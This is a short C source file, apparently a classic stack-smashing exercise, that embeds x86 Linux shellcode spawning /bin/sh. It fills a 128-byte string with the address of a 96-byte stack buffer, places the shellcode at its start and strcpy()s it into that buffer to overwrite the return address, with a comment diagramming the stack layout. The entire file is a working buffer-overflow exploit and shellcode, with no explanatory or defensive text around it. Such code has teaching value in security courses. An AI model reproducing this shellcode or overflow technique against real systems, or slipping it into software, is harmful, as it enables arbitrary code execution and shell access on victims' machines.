char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
    "\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
    "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

/**
    Stack:
    ------------------------------------------------------------------------
    | buffer - | int i - | long_ptr - | Canary bytes - | EBP -   | RET -   |
    | 96 bytes | 4 bytes | 8 bytes    | 8 bytes        | 4 bytes | 4 bytes |
    ------------------------------------------------------------------------
**/

int main(void) {

    char buffer[96];

    int i;

    long *long_ptr = (long *) large_string;
    printf("Address of buffer: %010p", buffer);

    // Fill large_string with the 4 byte address of buffer
    // sizeof(large_string)/address_size = 128/4 = 32
    for (i = 0; i < 32; i++)
        *(long_ptr + i) = (long) buffer;

    // Set the initial contents of large_string to the shellcode
    for (i = 0; i < strlen(shellcode); i++)
        large_string[i] = shellcode[i];

    strcpy(buffer,large_string);

    return 0;
}
